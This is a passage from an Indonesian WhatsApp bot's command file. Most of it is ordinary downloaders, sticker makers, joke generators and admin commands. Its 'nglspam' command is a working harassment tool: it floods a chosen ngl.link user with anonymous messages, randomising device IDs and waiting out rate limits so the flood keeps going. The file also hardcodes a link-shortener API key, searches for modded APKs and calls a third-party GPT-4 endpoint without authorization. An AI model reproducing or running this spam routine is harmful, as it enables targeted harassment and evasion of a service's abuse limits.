 const title = $(el).find('a').text().trim();
 const link = $(el).find('a').attr('href');
 const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
 const size = sizeMatch ? sizeMatch[1] : undefined;
 return title ? { title, link, size } : null;
 }).get();

 return { creator: 'Daffa ~', status: 'success', code: 200, data };
 } catch (error) {
 console.error(error);
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
 }
 },
 
 download: async function(url) {
 const headers = {
 'referer': url,
 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
 'accept-language': 'en-US,en;q=0.9',
 'user-Agent': 'Postify/1.0.0',
 };

 try {
 const response = await axios.get(url, { headers });
 headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

 const [filename, mimetype, downloadLink] = [
 response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
 response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
 response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
 ];
 
 if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

 headers.Referer = downloadLink;
 const final = await axios.get(downloadLink, { headers });

 const [directLink, key, filesize] = [
 final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
 final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
 final.data.match(/Download File \((.*?)\)/)?.[1]
 ];

 const result = directLink + (key ? `&k=${key}` : '');
 if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

 const data = await this.convert(result, url);

 return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
 } catch (error) {
 return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
 }
 },

 convert: async function(url, directLink) {
 try {
 const init = await axios.get(url, {
 maxRedirects: 0,
 validateStatus: status => status >= 200 && status < 303,
 headers: {
 'Referer': directLink,
 'User-Agent': 'Postify/1.0.0'
 },
 });

 const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
 const redirect = init.headers.location;

 const final_result = await axios.get(redirect, {
 responseType: 'arraybuffer',
 headers: {
 'referer': directLink,
 'user-agent': 'Postify/1.0.0',
 'cookie': cookies,
 },
 });

 const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
 return {
 filename,
 mimeType: final_result.headers['content-type'],
 buffer: Buffer.from(final_result.data)
 };
 } catch (error) {
 throw error;
 }
 }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ ]* ── .々─ᯤ\n`
sfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `⏤͟͟͞͞╳────────── .✦`

await xyu.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
sendReaction("✅")
} catch (err) {
sendReaction("❌")
}}
break
//================================================================================

case 'setppbot': {
				if (!isCreator) return m.reply(mess.owner)
				if (!/image/.test(mime)) return m.reply(`Reply Image Dengan Caption ${prefix + command}`)
				let media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
				if (text.length > 0) {
					let { img } = await generateProfilePicture(media)
					await xyu.query({
						tag: 'iq',
						attrs: {
							to: botNumber,
							type: 'set',
							xmlns: 'w:profile:picture'
						},
						content: [{ tag: 'picture', attrs: { type: 'image' }, content: img }]
					})
					await fs.unlinkSync(media)
					m.reply('Sukses')
				} else {
					await xyu.updateProfilePicture(botNumber, { url: media })
					await fs.unlinkSync(media)
					m.reply('Sukses')
				}
			}
			break
			
			
			case 'setpppanjang': {
    if (!isCreator) return m.reply(mess.owner);
    if (!/image/.test(mime)) 
        return m.reply(`Reply Image Dengan Caption ${prefix + command}`);
    
    let media;
    try {
        media = await xyu.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg');
    } catch (error) {
        console.error('Error saat download media:', error);
        return m.reply('Gagal mendownload media. Coba lagi, ya!');
    }
    
    async function processProfilePicture(media) {
        try {
            const jimp1 = await jimp.read(media);
            const min = jimp1.getWidth();
            const max = jimp1.getHeight();
            const cropped = jimp1.crop(0, 0, min, max);
            return {
                img: await cropped.scaleToFit(720, 720).getBufferAsync(jimp.MIME_JPEG),
                preview: await cropped.normalize().getBufferAsync(jimp.MIME_JPEG),
            };
        } catch (error) {
            console.error('Error saat memproses gambar:', error);
            throw new Error('Gagal memproses gambar.');
        }
    }
    
    try {
        let { img } = await processProfilePicture(media);
        
        await xyu.query({
            tag: 'iq',
            attrs: {
                to: S_WHATSAPP_NET,
                type: 'set',
                xmlns: 'w:profile:picture'
            },
            content: [
                { 
                    tag: 'picture', 
                    attrs: { type: 'image' }, 
                    content: img 
                }
            ]
        });
        
        await fs.unlinkSync(media);
        m.reply('Sukses');
    } catch (error) {
        console.error('Error saat mengupdate profile picture:', error);
        m.reply('Gagal mengupdate profile picture. Cek log untuk detailnya.');
    }
}
break;
//================================================================================


case 'cekgenius': {
    const { createCanvas } = require('canvas');
    let name = text.trim();
    if (!name) return m.reply(`*Contoh :* .cekgenius Axel`);

    // Fungsi untuk memilih elemen acak
    function pickRandom(list) {
        return list[Math.floor(Math.random() * list.length)];
    }

    // Fungsi untuk membagi teks ke beberapa baris
    function wrapText(text, maxLength) {
        const words = text.split(' ');
        let lines = [], currentLine = '';

        words.forEach(word => {
            if ((currentLine + word).length <= maxLength) {
                currentLine += `${word} `;
            } else {
                lines.push(currentLine.trim());
                currentLine = `${word} `;
            }
        });

        if (currentLine) lines.push(currentLine.trim());
        return lines;
    }

    // Fungsi untuk mendapatkan deskripsi berdasarkan level
    function getDescriptionByLevel(level) {
        if (level <= 5) return 'Baru mulai berkembang.';
        if (level <= 15) return 'Potensimu terlihat.';
        if (level <= 25) return 'Pemikiranmu tajam.';
        if (level <= 35) return 'Kecerdasan berkembang pesat.';
        if (level <= 45) return 'Semakin bijaksana.';
        if (level <= 55) return 'Hampir puncak, inovatif.';
        if (level <= 65) return 'Pemikir luar biasa.';
        if (level <= 75) return 'Mampu memecahkan masalah kompleks.';
        if (level <= 85) return 'Menuju kesempurnaan.';
        if (level <= 95) return 'Mendekati sempurna.';
        if (level === 100) return 'Jenius sejati, sempurna!';
        return 'Deskripsi tidak tersedia';
    }

    const geniusLevels = [
        'Kecerdasan Level : 4%\n\nBaru mulai berkembang.',
        'Kecerdasan Level : 7%\n\nPotensimu terlihat.',
        'Kecerdasan Level : 12%\n\nPemikiranmu tajam.',
        'Kecerdasan Level : 22%\n\nKecerdasan berkembang pesat.',
        'Kecerdasan Level : 27%\n\nSemakin bijaksana.',
        'Kecerdasan Level : 35%\n\nHampir puncak, inovatif.',
        'Kecerdasan Level : 41%\n\nPemikir luar biasa.',
        'Kecerdasan Level : 48%\n\nMampu memecahkan masalah kompleks.',
        'Kecerdasan Level : 56%\n\nMenuju kesempurnaan.',
        'Kecerdasan Level : 64%\n\nMendekati sempurna.',
        'Kecerdasan Level : 71%\n\nJenius sejati.',
        'Kecerdasan Level : 77%\n\nTak terkalahkan.',
        'Kecerdasan Level : 83%\n\nMengubah dunia.',
        'Kecerdasan Level : 90%\n\nKecerdasan luar biasa.',
        'Kecerdasan Level : 95%\n\nTak terhentikan.',
        'Kecerdasan Level : 100%\n\nJenius sejati, sempurna!'
    ];

    name = name.charAt(0).toUpperCase() + name.slice(1).toLowerCase();

    // Canvas setup
    const canvas = createCanvas(637, 400);
    const ctx = canvas.getContext('2d');

    // Background gradient with modern motif
    const colors = ['#1E90FF', '#4682B4', '#5F9EA0', '#00BFFF', '#87CEEB'];
    const gradient = ctx.createLinearGradient(0, 0, 0, canvas.height);
    colors.forEach((color, index) => gradient.addColorStop(index / (colors.length - 1), color));
    ctx.fillStyle = gradient;
    ctx.fillRect(0, 0, canvas.width, canvas.height);

    // Adding modern geometric patterns
    ctx.fillStyle = 'rgba(255, 255, 255, 0.1)';
    for (let i = 0; i < 20; i++) {
        ctx.beginPath();
        ctx.arc(
            Math.random() * canvas.width,
            Math.random() * canvas.height,
            Math.random() * 100,
            0,
            Math.PI * 2
        );
        ctx.fill();
    }

    // Title
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 36px "Poppins", sans-serif';
    ctx.textAlign = 'center';
    ctx.fillText('HASIL PENGECEKAN GENIUS', canvas.width / 2, 50);

    // Name
    ctx.font = 'bold 40px "Lora", serif';
    ctx.fillText(name, canvas.width / 2, 120);

    // Progress bar background
    ctx.fillStyle = '#E0E0E0';
    ctx.fillRect(50, 180, 537, 20);

    const randomGenius = pickRandom(geniusLevels);
    const levelMatch = randomGenius.match(/Kecerdasan Level : (\d+)%/);
    if (!levelMatch) return m.reply('⚠️ Terjadi kesalahan dalam mendapatkan level kecerdasan!');
    const level = parseInt(levelMatch[1]);

    // Progress bar fill
    const progressWidth = (537 * level) / 100;
    const progressGradient = ctx.createLinearGradient(50, 180, 587, 180);
    progressGradient.addColorStop(0, '#1E90FF');
    progressGradient.addColorStop(1, '#87CEEB');
    ctx.fillStyle = progressGradient;
    ctx.fillRect(50, 180, progressWidth, 20);

    // Percentage text
    ctx.fillStyle = '#FFFFFF';
    ctx.font = 'bold 22px "Open Sans", sans-serif';
    ctx.fillText(`${level}%`, 170, 195);

    // Description text
    const description = getDescriptionByLevel(level);
    const lines = wrapText(description, 80);
    let textY = 230;
    ctx.fillStyle = '#FFD700';
    ctx.font = 'bold 18px "Poppins", sans-serif';
    ctx.shadowColor = 'rgba(0, 0, 0, 0.5)';
    ctx.shadowOffsetX = 3;
    ctx.shadowOffsetY = 3;
    ctx.shadowBlur = 10;

    lines.forEach((line, index) => {
        const lineY = textY + (index * 25);
        ctx.strokeStyle = '#FF4500';
        ctx.strokeText(line, canvas.width / 2, lineY);
        ctx.fillText(line, canvas.width / 2, lineY);
    });

    // Generate and send image
    const buffer = canvas.toBuffer();
    xyu.sendFile(m.chat, buffer, 'genius.png', 'Ini adalah hasil cek kecerdasanmu!', m);
}
break;

//================================================================================

case  'cekkhodam': case 'cekodam': case 'cekkodam':{
    const defaultLang = 'id';
    const gtts = require( 'node-gtts')
    // Penanganan input nama
    if (args.length === 0 || !args[0]) {
        return m.reply('Harap masukkan nama kamu.');
    } else {
        name = args[0];
    }

    let lang = args[1];
    if (!lang || lang.length !== 2) {
        lang = defaultLang;
    }
    
    const khodam = [
  "Singa",
  "kosoong atau tidak ada",
  "Harimau",
  "Elang",
  "Serigala",
  "Naga",
  "Gajah",
  "Kuda",
  "Macan Tutul",
  "Kerbau",
  "Burung Hantu",
  "Burung Rajawali",
  "Ikan Hiu",
  "Lumba-Lumba",
  "Ular",
  "Kura-Kura",
  "Tupai",
  "Paus",
  "Kelelawar",
  "Kijang",
  "Banteng",
  "Rusa",
  "Anjing",
  "Kucing",
  "Buaya",
  "Kambing",
  "Kuda Nil",
  "Bebek",
  "Angsa",
  "Ayam",
  "Merpati",
  "Burung Beo",
  "Burung Kenari",
  "Burung Kakatua",
  "Bunglon",
  "Cicak",
  "Kodok",
  "Katak",
  "Tikus",
  "Landak",
  "Kanguru",
  "Koala",
  "Panda",
  "Beruang",
  "Rubah",
  "Lynx",
  "Leopard",
  "Jaguar",
  "Cheetah",
  "Badak",
  "Zebra",
  "Antelop",
  "Unta",
  "Alpaka",
  "Llama",
  "Serigala Abu-abu",
  "Serigala Merah",
  "Serigala Putih",
  "Lynx",
  "Harimau Putih",
  "Harimau Siberia",
  "Harimau Sumatra",
  "Gorila",
  "Orangutan",
  "Simpanse",
  "Monyet",
  "Babun",
  "Lemur",
  "Iguana",
  "Komodo",
  "Salamander",
  "Belut",
  "Sotong",
  "Gurita",
  "Kepiting",
  "Lobster",
  "Udang",
  "Kupu-kupu",
  "Lebah",
  "Tawon",
  "Kumbang",
  "Belalang",
  "Jangkrik",
  "Semut",
  "Kecoak",
  "Laba-laba",
  "Kalajengking",
  "Serangga Tongkat",
  "Naga Laut",
  "Kuda Laut",
  "Duyung",
  "Putri Duyung",
  "Burung Kolibri",
  "Burung Hantu Salju",
  "Burung Puyuh",
  "Burung Gagak",
  "Burung Pelikan",
  "Burung Albatros",
  "Burung Flamingo",
  "Burung Hering",
  "Burung Camar",
  "Burung Pinguin",
    "Cincin",
    "Batu Akik",
    "Keris",
    "Tongkat",
    "Pusaka",
    "Patung",
    "Mustika",
    "Tasbih",
    "Kalung",
    "Gelang",
    "Permata",
    "Pedang",
    "Mata Uang",
    "Wesi Kuning",
    "Serat Tali",
    "Belati",
    "Cundrik",
    "Selendang",
    "Jarum",
    "Tombak",
    "Kerikil",
    "Kendi",
    "Kain Kafan",
    "Topi",
    "Payung",
    "Sandal",
    "Kacamata",
    "Sabuk",
    "Sarung",
    "Tali Ikat Pinggang",
    "Surat",
    "Kunci",
    "Lilin",
    "Peniti",
    "Sisir",
    "Cermin",
    "Kendi Air",
    "Piring",
    "Gelas",
    "Mangkuk",
    "Sendok",
    "Sapu",
    "Gayung",
    "Tikar",
    "Bantal",
    "Guci",
    "Lentera",
    "Lampu",
    "Buku",
    "Pena",
    "Dupa",
    "Asbak",
    "Cangkir",
    "Gantungan Kunci",
    "Kalender",
    "Sepeda",
    "Lukisan",
    "Batu Kerikil",
    "Batu Kali",
    "Kipas",
    "Peci",
    "Sorban",
    "Rokok",
    "Topeng",
    "Gamelan",
    "Angklung",
    "Suling",
    "Wayang",
    "Kuda-Kudaan",
    "Pipa Rucika",
"Botol Tupperware",
"Badut Mixue",
"Sabun GIV",
"Sandal Swallow",
"Jarjit",
"Ijat",
"Fizi",
"Mail",
"Ehsan",
"Upin",
"Ipin",
"Sungut Lele",
"Tok Dalang",
"Opah",
"Opet",
"Alul",
"Pak Vinsen",
"Maman Resing",
"Pak RT",
"Admin ETI",
"Bung Towel",
"Lumpia Basah",
"Martabak Manis",
"Baso Tahu",
"Tahu Gejrot",
"Dimsum",
"Seblak Ceker",
"Telor Gulung",
"Tahu Aci",
"Tempe Mendoan",
"Nasi Kucing",
"Kue Cubit",
"Tahu Sumedang",
"Nasi Uduk",
"Wedang Ronde",
"Kerupuk Udang",
"Cilok",
"Cilung",
"Kue Sus",
"Jasuke",
"Seblak Makaroni",
"Sate Padang",
"Sayur Asem",
"Kromboloni",
"Marmut Pink",
"Belalang Mullet",
"Kucing Oren",
"Lintah Terbang",
"Singa Paddle Pop",
"Macan Cisewu",
"Vario Mber",
"Beat Mber",
"Supra Geter",
"Oli Samping",
"Knalpot Racing",
"Jus Stroberi",
"Jus Alpukat",
"Alpukat Kocok",
"Es Kopyor",
"Es Jeruk",
"Cappucino Cincau",
"Jasjus Melon",
"Teajus Apel",
"Pop ice Mangga",
"Teajus Gulabatu",
"Air Selokan",
"Air Kobokan",
"TV Tabung",
"Keran Air",
"Tutup Panci",
"Kotak Amal",
"Tutup Termos",
"Tutup Botol",
"Kresek Item",
"Kepala Casan",
"Ban Serep",
"Kursi Lipat",
"Kursi Goyang",
"Kulit Pisang",
"Warung Madura",
"Gorong-gorong",
"Tai Kuda",
"Tikus Kentut",
"Banteng Merah",
"Bajigur",
"Bakso Sumatra",
"Neymar Bogor",
"Christiano Rojali",
"Batagor",
"Seblak Kalimantan",
"Macan Putih",
"Harimau Sumatra",
"Harimau Putih",
"Singa",
"Raja Iblis",
"Telur Betawi",
    "Sepatu",
    "Jam Tangan",
    "Kosong atau tidak adaa"
];


    const randomKhodam = khodam[Math.floor(Math.random() * khodam.length)];
    let text = `Khodam ${q} adalah ${randomKhodam}`;
function tts(text, lang = 'id') {
return new Promise((resolve, reject) => {
try {
let tts = gtts(lang)
let filePath =  (1 * new Date) + '.mp3'
tts.save(filePath, text, () => {
resolve(fs.readFileSync(filePath))
fs.unlinkSync(filePath)
})
} catch (e) { reject(e) }
})
}    
    let res;
    try {
        res = await tts(text, lang);
    } catch (e) {
        m.reply(e + '');
        res = await tts(text, defaultLang);
    } finally {
        m.reply(text)
        if (res) {
await xyu.sendMessage(m.chat, { audio: res, ptt: true, mimetype: "audio/mpeg", fileName: "vn.mp3", waveform: [100, 0, 100, 0, 100, 0, 100] }, { quoted: m });
        }
    }
};
break

//================================================================================
case "apkmod": {
if (!text) return m.reply(example("capcut"))
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/happymod?query=${text}`).then((res) => {
let teks = ""
for (let i of res.result) {
teks += `\n* *Nama Apk :* ${i.title}
* *Rating :* ${i.rating}
* *Link Download:* ${i.link}\n`
}
m.reply(teks)
xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch(e => m.reply("Error result not found."))
}
break

//================================================================================

case "instagram": case "igdl": case "ig": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
await fetchJson(`https://btch.us.kg/download/igdl?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await xyu.sendMessage(m.chat, {video: {url: res.result[0].url}, mimetype: "video/mp4", caption: "*Instagram Downloader ✅*"}, {quoted: m})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}).catch((e) => m.reply("Error! Result Not Found"))
}
break

//================================================================================

case 'nglspam': {
if (!isCreator && !isPremium) return reply(mess.prem)
 if (!text.split("|")[0] || !text.split("|")[1] || !text.split("|")[2]) {
 return m.reply("Masukan username, pesan, dan jumlah spam!\nContoh: .nglspam ditss|haloo|5");
 }
async function sendSpamMessage(username, message, spamCount) {
 let counter = 0;
 while (counter < spamCount) {
 try {
 const date = new Date();
 const minutes = date.getMinutes();
 const hours = date.getHours();
 const formattedDate = `${hours}:${minutes}`;
 const deviceId = crypto.randomBytes(21).toString('hex');
 const url = 'https://ngl.link/api/submit';
 const headers = {
 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0',
 'Accept': '*/*',
 'Accept-Language': 'en-US,en;q=0.5',
 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
 'X-Requested-With': 'XMLHttpRequest',
 'Sec-Fetch-Dest': 'empty',
 'Sec-Fetch-Mode': 'cors',
 'Sec-Fetch-Site': 'same-origin',
 'Referer': `https://ngl.link/${username}`,
 'Origin': 'https://ngl.link'
 };
 const body = `username=${username}&question=${message}&deviceId=${deviceId}&gameSlug=&referrer=`;

 const response = await fetch(url, {
 method: 'POST',
 headers,
 body,
 mode: 'cors',
 credentials: 'include'
 });

 if (response.status !== 200) {
 console.log(`[${formattedDate}] [Err] Ratelimited`);
 await new Promise(resolve => setTimeout(resolve, 25000));
 } else {
 counter++;
 console.log(`[${formattedDate}] [Msg] Sent: ${counter}`);
 }
 } catch (error) {
 console.error(`[${formattedDate}] [Err] ${error}`);
 await new Promise(resolve => setTimeout(resolve, 5000));
 }
 }
};
 const [username, message, count] = text.split("|");
 const spamCount = parseInt(count, 10);

 if (isNaN(spamCount) || spamCount <= 0) {
 return m.reply("Jumlah spam harus berupa angka positif!");
 }

 try {
 await sendSpamMessage(username, message, spamCount);
 m.reply(`Sukses mengirim ${spamCount} pesan NGL ke ${username}`);
 } catch (e) {
 console.error(e); // Menambahkan logging error untuk debug
 return m.reply("Fitur error, coba lagi nanti.");
 }
}
break



//================================================================================

case "gitclone": {
if (!text) return m.reply(example("https://github.com/Skyzodev/Simplebot"))
let regex = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
if (!regex.test(text)) return m.reply("Link tautan tidak valid")
try {
    let [, user, repo] = args[0].match(regex) || []
    repo = repo.replace(/.git$/, '')
    let url = `https://api.github.com/repos/${user}/${repo}/zipball`
    let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
    xyu.sendMessage(m.chat, { document: { url: url }, mimetype: 'application/zip', fileName: `${filename}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! Repositori Tidak Ditemukan`)
}}
break

//================================================================================
case "brat": {
if (!text) return m.reply(example('teksnya'))
let res = await getBuffer(`https://qyuunee-brat.hf.space/brat?q=${text}`)
await xyu.sendAsSticker(m.chat, res, m, {packname: "Takashi Botx"})
}
break


//===============================================================================

case 'brat2': {
  const inputText = args.length > 0 
    ? args.join(" ") 
    : m.quoted?.text || null;

  if (!inputText) return reply("Masukkan teks!!");
  try {
    const response = await axios.get(`https://fgsi-brat.hf.space/?text=${encodeURIComponent(inputText)}&modeBlur=true`, {
      responseType: 'arraybuffer', 
    });
    const imageBuffer = Buffer.from(response.data);
    await xyu.imgToSticker(m.chat, imageBuffer, m, {
      packname: "Created by Takashi - botz"
    });
  } catch (error) {
    console.error("Kesalahan API:", error.response ? error.response.data : error.message);
    reply("Terjadi kesalahan saat memproses permintaan. Coba lagi nanti.");
  }
}
break;

//================================================================================

case "ttimg":{
if (!text) return m.reply(example("url"))
if (!text.startsWith("https://")) return m.reply(example("url"))
await tiktokDl(q).then(async (result) => {
await xyu.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Tiktok Downloader ✅*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await xyu.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Tiktok Downloader ✅*`}, {quoted: m})
}
}).catch(e => console.log(e))
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//================================================================================

case "ssweb": {
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
const {
  screenshotV1, 
  screenshotV2,
  screenshotV3 
} = require('getscreenshot.js')
const fs = require('fs')
var data = await screenshotV2(text)
await xyu.sendMessage(m.chat, { image: data, mimetype: "image/png"}, {quoted: m})
}
break
//===============================================================================
/*
case 'afk': {
				let user = db.users[m.sender]
				user.afkTime = + new Date
				user.afkReason = text
				m.reply(`@${m.sender.split('@')[0]} Telah Afk${text ? ': ' + text : ''}`)
			}
			break
			*/
//================================================================================

case 'delcase': {
if (!isCreator) return reply(`ᴋʜᴜsᴜs xyura`)
if (!q) return reply('*Masukan nama case yang akan di hapus*')

dellCase('./case.js', q)
reply('*Dellcase Successfully*')
}
break

//================================================================================

case 'delsesi':
case 'clear':
case 'ds':
case 'clearsession':{
if (!isCreator) return reply(mess.owner)
fs.readdir("./session", async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return reply('Unable to scan directory: ' + err);
}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state")
)
console.log(filteredArray.length);
/*let teks = `Terdeteksi ${filteredArray.length} file sampah\n\n`
if (filteredArray.length == 0) return reply(teks)
filteredArray.map(function(e, i) {
teks += (i + 1) + `. ${e}\n`
})
reply(teks)
await sleep(2000)*/
 reply("Menghapus file sampah...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./session/${file}`)
});
await sleep(2000)
 reply("Berhasil menghapus semua sampah di folder session")
});
}
break    



case 'hapus': case 'd': case 'delete': case 'del': {
if (!isCreator) return reply(mess.owner) 
if (!m.quoted) return reply('Reply pesan yang ingin dihapus!')
await xyu.sendMessage(from, {delete: {remoteJid: from, id: m.quoted.id, fromMe: m.quoted.fromMe, participant: m.quoted.sender }})
sendReaction("✅")
}
break

//================================================================================

case "shortlink": case "shorturl": {
if (!isPremium) return reply(mess.prem)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break


case "shortlink-dl": {
if (!isPremium) return reply(mess.prem)
if (!text) return m.reply(example("https://example.com"))
if (!isUrl(text)) return m.reply(example("https://example.com"))
var a = await fetch(`https://moneyblink.com/st/?api=524de9dbd18357810a9e6b76810ace32d81a7d5f&url=${text}`)
await xyu.sendMessage(m.chat, {text: a.url}, {quoted: m})
}
break

//================================================================================

case "idgc": case "cekidgc": {
if (!isPremium) return reply(mess.prem)
if (!m.isGroup) return Reply(mess.group)
m.reply(m.chat)
}
break

//================================================================================

case "listgc": case "listgrup": {
if (!isCreator) return
let teks = `\n *乂 List all group chat*\n`
let a = await xyu.groupFetchAllParticipating()
let gc = Object.values(a)
teks += `\n* *Total group :* ${gc.length}\n`
for (const u of gc) {
teks += `\n* *ID :* ${u.id}
* *Nama :* ${u.subject}
* *Member :* ${u.participants.length}
* *Status :* ${u.announce == false ? "Terbuka": "Hanya Admin"}
* *Pembuat :* ${u?.subjectOwner ? u?.subjectOwner.split("@")[0] : "Sudah Keluar"}\n`
}
return m.reply(teks)
}
break

//================================================================================

case "cekidch": case "idch": {
if (!isPremium) return reply(mess.prem)
if (!text) return m.reply(example("linkchnya"))
if (!text.includes("https://whatsapp.com/channel/")) return m.reply("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await xyu.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break

//================================================================================

case "pin": case "pinterest": {
if (!text) return m.reply(example("anime dark"))
await xyu.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: xyu.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xyu.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await xyu.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break


//================================================================================

case 'ai': {
  if (!text) return reply(`Hai, apa yang ingin saya bantu?`)
async function openai(text, logic) { // Membuat fungsi openai untuk dipanggil
    let response = await axios.post("https://chateverywhere.app/api/chat/", {
        "model": {
            "id": "gpt-4",
            "name": "GPT-4",
            "maxLength": 32000,  // Sesuaikan token limit jika diperlukan
            "tokenLimit": 8000,  // Sesuaikan token limit untuk model GPT-4
            "completionTokenLimit": 5000,  // Sesuaikan jika diperlukan
            "deploymentName": "gpt-4"
        },
        "messages": [
            {
                "pluginId": null,
                "content": text, 
                "role": "user"
            }
        ],
        "prompt": logic, 
        "temperature": 0.5
    }, { 
        headers: {
            "Accept": "/*/",
            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
        }
    });
    
    let result = response.data;
    return result;
}

let kanjuthann = await openai(text, "nama mu adalah Takashi-Botz, kamu adalah asisten kecerdasan buatan yang sering membantu orang lain jika ada yang ditanyakan")
reply(kanjuthann)
}
break

case 'hercai': case 'gpt':
case 'gemini': {
    const prompt = text.trim();
    if (!prompt) {
        return reply("Masukkan prompt untuk digunakan! Contoh: .gemini Explain how AI works");
    }
// Fungsi untuk mengirim permintaan ke API Gemini
const sendToGemini = async (prompt) => {
